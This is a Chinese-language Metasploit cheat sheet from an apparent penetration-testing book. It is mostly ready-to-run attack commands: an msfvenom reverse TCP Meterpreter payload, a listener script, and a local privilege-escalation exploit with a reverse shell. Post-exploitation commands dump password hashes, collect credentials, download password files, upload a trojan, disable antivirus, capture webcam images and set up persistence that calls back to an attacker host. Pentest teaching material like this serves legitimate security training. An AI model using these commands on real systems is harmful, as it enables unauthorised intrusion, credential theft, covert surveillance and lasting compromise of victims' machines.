# 第十三章：Metasploit 备忘单

在开始利用阶段之前，你必须从头到尾了解 Metasploit 框架，因此我为你准备了一个 Metasploit 框架的快速参考（备忘单）。

# Metasploit 框架

使用以下脚本文件启动 Metasploit：

```
$msfconsole -r test.rc
```

要运行 Metasploit，使用以下命令：

```
$msfconsole
```

# 使用数据库

在 Kali Linux 中，使用数据库之前需要启动`postgresql`服务器：

```
$ systemctl start postgresql
```

启动`postgresql`后，你需要使用`msfdb init`创建并初始化`msf`数据库：

```
$ msfdb init
```

如果你刚创建了一个新的漏洞利用并想要刷新`metasploit db`以开始使用新创建的漏洞利用，请输入以下命令：

```
$service postgresql restart && msfdb reinit
```

然后，输入以下命令：

```
$msfconsole -q
```

`-q`将以调试模式启动`msfconsole`，因此如果你在新的漏洞利用类中犯了错误，调试器将把错误信息打印到屏幕上。

# 更多与数据库相关的命令

+   `msf > db_status`：此命令将确认 Metasploit 是否成功连接到数据库

+   `msf > workspace`：这将显示当前选择的工作区

+   `msf > workspace [新工作区]`：这将把当前工作区切换为所选的新工作区

+   `msf > workspace -a [要添加的工作区名称]`：这是要添加的工作区名称

+   `msf > workspace -d [要删除的工作区名称]`：这是要删除的工作区名称

+   `msf > db_import [XML 文件夹路径]`：这将导入先前扫描的文件，例如`db_import /root/msfu/nmapScan`

+   `msf > db_nmap [nmap 参数]`：这将使用 Nmap 进行扫描，例如`db_nmap -A 172.16.194.134`

+   `msf > hosts`：此命令将在扫描后列出发现的主机

+   `msf > services`：此命令将在扫描后列出发现的服务

+   `msf > creds`：此命令将在暴力破解扫描后列出任何找到的凭证

+   `msf > loot`：如果你已经攻破了系统，这将获取哈希转储

+   `msf > db_export -f [格式] [XML 文件路径]`：例如，`db_export -f xml /root/msfu/Exported.xml`

# 环境导航

+   `msf > search`：此命令将根据你提供的搜索条件查找特定模块（尝试执行`help search`）

+   `msf > search [任何关键词]`：例如，`search apache version 2.3`

+   `msf > grep & search`：例如，`grep http search apache`

+   **搜索关键词**：

    +   `app`：客户端或服务器攻击模块

    +   `author`：此作者编写的模块

    +   `bid`：具有匹配 Bugtraq ID 的模块

    +   `cve`：具有匹配 CVE ID 的模块

    +   `edb`：具有匹配 Exploit-DB ID 的模块

    +   `name`：具有匹配描述名称的模块

    +   `platform`：影响此平台的模块

    +   `ref`：具有匹配`ref`的模块

    +   `type`：特定类型（exploit、auxiliary 或 post）的模块

+   **示例**：

    +   `msf > search cve:2009 type:exploit app:client`

    +   `msf > search name:mysql`

    +   `msf > search platform:windows`

    +   `msf > search type:auxiliary`

+   **更多命令**：

    +   `msf > help`：列出可用命令

    +   `msf > back`：返回一步

    +   `msf > exit`：退出 msfconsole

# 使用模块

+   `msf > use [module name]`: 选择一个模块并使用它。例如，使用 `dos/windows/smb/ms09_001_write`。

+   `msf > show`: 这将显示 Metasploit 中某个特定项目的信息。

+   `msf > show`: 在 `msfconsole` 提示符下输入 `show` 将显示 Metasploit 中的每个模块。

+   `msf > show options`: 这将显示模块的选项。

+   `msf > show auxiliary`: 这将显示 Metasploit 中所有可用的辅助模块的列表。

+   `msf > show exploits`: 这将列出框架中所有的漏洞利用。

+   `msf > show payloads`: 这将显示所有不同的有效载荷（无论是 Metasploit 中的，还是同一模块中的）。

+   `msf > show targets`: 这将显示在漏洞模块的上下文中支持哪些目标。

+   `msf > show advanced`: 如果你想进一步调整漏洞利用，使用此命令查看更多高级选项。

+   `msf > show encoders`: 这将显示 msfconsole 中可用的编码器列表。

+   `msf > show nops`: 这将显示 Metasploit 提供的 NOP 生成器列表。

+   `msf > info [module name]`: 这将提供关于某个模块的详细信息。例如，`info exploit/windows/http/apache_chunked`。

+   `msf > check`: 这将验证目标是否存在漏洞，但你需要先设置选项。

+   `msf > set`: `set` 命令允许你为当前正在使用的模块配置框架选项和参数。例如，`set RHOST 172.16.194.134`。

+   `msf > setg`: 这将设置 `msfconsole` 中的全局变量。例如，`setg LHOST 10.0.0.100`。

+   `msf > unset`: `unset` 命令删除先前通过 `set` 配置的参数。你可以通过 `unset all` 删除所有已分配的变量。例如，`unset THREADS`。

+   `msf > save`: `save` 命令将保存当前的环境和设置。

+   `msf > jobs [option]`: `jobs` 命令提供列出和终止这些任务的功能。使用 `jobs -h` 命令获取可用选项。例如，`jobs -l`。

# 杂项

+   `msf > load [plugin name]`: `load` 命令从 Metasploit 的插件目录加载插件。参数通过 `key=val` 的形式传递给 shell。例如，`load pcap_log`。

+   `msf > unload [plugin name]`: `unload` 命令卸载先前加载的插件并移除任何扩展命令。例如，`unload pcap_log`。

+   `msf > loadpath [module path]`: `loadpath` 命令将加载一个第三方模块路径，以便你可以将 Metasploit 指向你的 0-day 漏洞、编码器、有效载荷等。例如，`loadpath exploit/windows/test/test_module`。

+   `msf > connect [IP]`: 这与 `netcat` 类似，适用于横幅抓取和与服务交互。例如，`connect 192.168.1.10`。

# msfvenom

`msfvenom` 可以用于生成 Windows 操作系统的反向 TCP Meterpreter 有效载荷，例如：

```
$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
```

+   **平台**: 以下是我们可以使用的平台值：

`Cisco` 或 `cisco`，`OSX` 或 `osx`，`Solaris` 或 `solaris`，`BSD` 或 `bsd`，`OpenBSD` 或 `openbsd`，`hardware`，`Firefox` 或 `firefox`，`BSDi` 或 `bsdi`，`NetBSD` 或 `netbsd`，`NodeJS` 或 `nodejs`，`FreeBSD` 或 `freebsd`，`Python` 或 `python`，`AIX` 或 `aix`，`JavaScript` 或 `javascript`，`HPUX` 或 `hpux`，`PHP` 或 `php`，`Irix` 或 `irix`，`Unix` 或 `unix`，`Linux` 或 `linux`，`Ruby` 或 `ruby`，`Java` 或 `java`，`Android` 或 `android`，`Netware` 或 `netware`，`Windows` 或 `windows`，`mainframe`，`multi`。

+   **可执行格式**：以下是我们可以使用的可执行格式：

`asp`，`aspx`，`aspx-exe`，`dll`，`elf`，`elf-so`，`exe`，`exe-only`，`exe-service`，`exe-small`，`hta-psh`，`loop-vbs`，`macho`，`msi`，`msi-nouac`，`osx-app`，`psh`，`psh-net`，`psh-reflection`，`psh-cmd`，`vba`，`vba-exe`，`vba-psh`，`vbs`，`war`。

+   **转换格式**：以下是我们可以使用的转换格式：

`bash`，`c`，`csharp`，`dw`，`dword`，`hex`，`java`，`js_be`，`js_le`，`num`，`perl`，`pl`，`powershell`，`ps1`，`py`，`python`，`raw`，`rb`，`ruby`，`sh`，`vbapplication`，`vbscript`。

# 监听脚本

```
$ touch script.rc $ echo use exploit/multi/handler >> script.rc $ echo set PAYLOAD windows/meterpreter/reverse_tcp >> script.rc $ echo set LHOST 192.168.0.114 >> script.rc $ echo set ExitOnSession false >> script.rc $ echo exploit -j -z >> script.rc $ msfconsole -r script.rc
```

# Meterpreter

+   `msf > sessions [选项或 ID]`：`sessions` 命令允许你列出、交互并结束已生成的会话。会话可以是 shell、Meterpreter 会话、VNC 等（使用 `sessions -h` 获取帮助）。

+   `meterpreter > background`：将当前的 Meterpreter 会话发送到后台，并返回到 `msf` 提示符。

+   `meterpreter > getuid`：显示 Meterpreter 服务器是否在主机上运行。

+   `meterpreter > sysinfo`：显示受害者的操作系统信息。

+   `meterpreter > cd`：更改受感染系统上的当前目录。

+   `meterpreter > ls`：列出当前目录中的文件。

+   `meterpreter > pwd`：打印受感染系统上的当前目录。

+   `meterpreter > ps`：显示目标主机上正在运行的进程列表。

+   `meterpreter > run post/windows/manage/migrate`：迁移到受害者的另一个进程。

+   `meterpreter > use priv`：在执行 `getsystem` 命令之前使用此命令。

+   `meterpreter > getsystem`：使用此命令提升你的权限。

如果你遇到错误 `priv_elevate_getsystem: 操作失败：访问被拒绝`，请按照以下步骤操作：

```
meterpreter > background
```

**选项 1**：

```
msf > use post/multi/recon/local_exploit_suggester msf post(local_exploit_suggester) > show options msf post(local_exploit_suggester) > run
```

**选项 2**：

+   `msf > use exploit/windows/local/`：列出所有 Windows 漏洞。

+   `msf > use exploit/windows/local/ms10_015_kitrap0d`：我们从列表中选择了一个漏洞，具体如下：

```
msf exploit(ms10_015_kitrap0d) > show options msf exploit(ms10_015_kitrap0d) > set SESSION 1 msf exploit(ms10_015_kitrap0d) > set PAYLOAD windows/meterpreter/reverse_tcp msf exploit(ms10_015_kitrap0d) > set LHOST 192.168.1.100 msf exploit(ms10_015_kitrap0d) > set LPORT 4445 msf exploit(ms10_015_kitrap0d) > exploit meterpreter > getuid Server username: NT AUTHORITY\SYSTEM - Hooray
```

+   `meterpreter > search`：提供在目标主机上查找特定文件的方法。例如，`search -f passwords*.txt`。

+   `meterpreter > cat [文件名路径]`：当提供文件路径作为参数时，显示文件内容。

+   `meterpreter > download [文件名路径]`：从远程主机下载文件。注意，提供 Windows 路径时要使用双斜杠。例如，`download C:\\passwords.txt`。

+   `meterpreter > upload [local file name] [remote path]`：例如，`upload evil_trojan.exe c:\\windows\\system32`。

+   `meterpreter > execute [command]`：在目标系统上运行命令。

+   `meterpreter > shell`：在目标系统上执行 Shell（终端或 DOS）。

+   `meterpreter > run post/windows/gather/hashdump`：一个后期模块，用于转储 SAM 数据库的内容。

+   `meterpreter > ipconfig`：显示远程机器上的网络接口和地址。

+   `meterpreter > webcam_list`：显示目标主机上当前可用的摄像头列表。

+   `meterpreter > webcam_snap`：从目标系统连接的网络摄像头抓取一张图片，并将其保存为 JPEG 图像到磁盘。默认情况下，保存位置是本地当前工作目录，文件名随机生成。例如，`webcam_snap -i 1 -v false`。

+   `meterpreter > python_import [local python file]`：导入本地 Python 文件并在受害者的机器上执行。例如，`meterpreter > python_import -f /root/readAutoLogonREG.py`。

+   `meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24`

+   `meterpreter > run post/windows/gather/checkvm`：检查受害主机是否为虚拟机。

+   `meterpreter > run post/windows/gather/credentials/credential_collector`：在被攻陷的主机上收集密码哈希和令牌。

+   `meterpreter > run post/windows/gather/dumplinks`：`dumplinks`模块解析用户最近文档中的`.lnk`文件，这对于进一步的信息收集非常有用。

+   `meterpreter > run post/windows/gather/enum_applications`：枚举在受害主机上安装的应用程序。

+   `meterpreter > run post/windows/gather/enum_logged_on_users`：返回当前和最近登录的用户列表及其 SID。

+   `meterpreter > run post/windows/gather/enum_shares`：返回在受害系统上配置和最近使用的共享列表。

+   `meterpreter > run post/windows/gather/enum_snmp`：枚举目标上的 SNMP 服务配置（如果存在），包括社区字符串。

+   `meterpreter > run post/windows/gather/hashdump`：使用注册表转储受害主机上的本地用户账户。

+   `meterpreter > run post/windows/gather/usb_history`：枚举受害系统上的 USB 驱动器历史记录。

+   `meterpreter > run getcountermeasure`：检查受害者系统的安全配置，并能禁用其他安全措施，如 A/V、防火墙等。

+   `meterpreter > run getgui -e`：如果目标系统的 RDP 被禁用，则启用 RDP。

+   `meterpreter > run gettelnet -e`：如果 Telnet 在受害者系统中被禁用，则启用 Telnet。

+   `meterpreter > run killav`：禁用目标上作为服务运行的大部分杀毒软件。

+   `meterpreter > run remotewinenum -u administrator -p password123 -t 10.0.0.100`：通过`wmic`枚举受害者的系统信息。记录日志存储位置。

+   `meterpreter > run scraper`：抓取系统信息，包括整个注册表。

+   `meterpreter > run winenum`：这是一款非常详细的 Windows 枚举工具。它会导出令牌、哈希值等更多信息。

+   `meterpreter > run persistence -U -i 10 -p 443 -r 192.168.1.5`：配置我们的持久化 Meterpreter 会话，直到用户登录到远程系统并尝试每 10 秒通过 `192.168.1.5` 的 `443` 端口回连到我们的监听器。
